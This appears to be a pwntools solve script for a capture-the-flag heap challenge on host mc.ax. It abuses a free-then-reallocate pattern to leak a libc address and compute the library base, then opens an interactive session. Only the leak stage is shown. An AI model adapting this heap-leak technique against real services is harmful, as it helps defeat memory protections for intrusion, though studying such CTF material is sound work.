from pwn import *


elf = ELF('./chall', checksec=False)
libc = elf.libc
global p


def pstr(size, content):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"size? ", size)
    p.sendlineafter(b"str? ", content)
    p.recvuntil(b"stored at ")
    return p.recvuntil(b"!", drop=True)

def pdel(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx? ", idx)

def tok(idx, delim):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx? ", idx)
    p.sendlineafter(b"delim? ", delim)
    return p.recvuntil(b"\n\n", drop=True)

#p = process(elf.path)
p = remote("mc.ax", 32526)


"""

Get leak

"""


pstr(b"1280", b"salut")
pstr(b"1280", b"salut")
pdel(b"0")
pstr(b"0\n", b"")

leak = tok(b"0", b"^").split(b"\n")[0].ljust(8, b"\x00")
leak = u64(leak)

libc.address = leak - 1913072

if 'remote' in str(p):
    libc.address -= 0xfe0

info("libc @0x%hx" % libc.address)


pdel(b"0")


p.interactive()